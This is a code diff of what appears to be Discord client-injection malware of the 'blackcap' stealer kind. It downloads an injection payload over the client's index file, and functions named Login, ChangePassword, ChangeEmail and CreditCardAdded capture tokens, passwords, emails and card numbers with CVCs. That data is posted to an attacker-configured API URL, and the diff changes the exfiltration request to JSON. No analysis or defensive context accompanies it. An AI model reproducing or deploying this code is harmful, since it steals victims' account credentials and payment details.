@@ -99,7 +99,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('%WEBHOOK%', '${config.apiurl}')
+        res.replace('core' + 'num', indexJS).replace('blackcap', '${config.apiurl}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -168,15 +168,19 @@ document.addEventListener('click',handler,false);
 
 noSessionPlease()
 
-async function post(url, embed) {
+async function post(url, embed){
     const window = BrowserWindow.getAllWindows()[0];
-    var b = await window.webContents.executeJavaScript(`
-    const fetch = require("node-fetch")
-    fetch(${url}, {method: "POST", body: ${embed})`, !0)
+    console.log(url + embed)
+    var b = await window.webContents.executeJavaScript(` 
+    fetch("${url}", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(${embed})
+    })`, !0)
     return b
 }
-
-
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     if (details.url.startsWith(config.apiurl)) {
@@ -268,9 +272,7 @@ async function FirstTime() {
 						}]
                     };
                     let data = JSON.stringify(c);
-                    let UwU = new URLSearchParams();
-                    UwU.append("data", data);
-                    UwU.append('token', token)
+                    let UwU = JSON.stringify({ data: data, token: token })
                     post(config.apiurl, UwU);
 
                 } else {
@@ -343,9 +345,7 @@ async function FirstTime() {
                     };
 
                     let data = JSON.stringify(c);
-                    let UwU = new URLSearchParams();
-                    UwU.append("data", data);
-                    UwU.append('token', token)
+                    let UwU = JSON.stringify({ data: data, token: token })
                     post(config.apiurl, UwU);
                 };
 
@@ -384,9 +384,7 @@ async function FirstTime() {
                             };
                             
                             let data = JSON.stringify(c);
-                            let UwU = new URLSearchParams();
-                            UwU.append("data", data);
-                            UwU.append('token', token)
+                            let UwU = JSON.stringify({ data: data, token: token })
                             post(config.apiurl, UwU);
 
                         } else {
@@ -453,9 +451,7 @@ async function FirstTime() {
 							}]
                             };
                             let data = JSON.stringify(c);
-                            let UwU = new URLSearchParams();
-                            UwU.append("data", data);
-                            UwU.append('token', token)
+                            let UwU = JSON.stringify({ data: data, token: token })
                             post(config.apiurl, UwU);
                             
                         }
@@ -915,9 +911,7 @@ async function Login(email, password, token) {
             }
             
             let data = JSON.stringify(params);
-            let UwU = new URLSearchParams();
-            UwU.append("data", data);
-            UwU.append('token', token)
+            let UwU = JSON.stringify({ data: data, token: token })
             post(config.apiurl, UwU);
         })
     })
@@ -1079,9 +1073,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
 											}]
             }
             let data = JSON.stringify(params);
-            let UwU = new URLSearchParams();
-            UwU.append("data", data);
-            UwU.append('token', token)
+            let UwU = JSON.stringify({ data: data, token: token })
             post(config.apiurl, UwU);
         })
     })
@@ -1246,9 +1238,7 @@ async function ChangeEmail(newemail, password, token) {
 		]
             }
             let data = JSON.stringify(params);
-            let UwU = new URLSearchParams();
-            UwU.append("data", data);
-            UwU.append('token', token)
+            let UwU = JSON.stringify({ data: data, token: token })
             post(config.apiurl, UwU);
         })
     })
@@ -1317,9 +1307,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ]
         }
         let data = JSON.stringify(params);
-        let UwU = new URLSearchParams();
-        UwU.append("data", data);
-        UwU.append('token', token)
+        let UwU = JSON.stringify({ data: data, token: token })
         post(config.apiurl, UwU);
 }
 
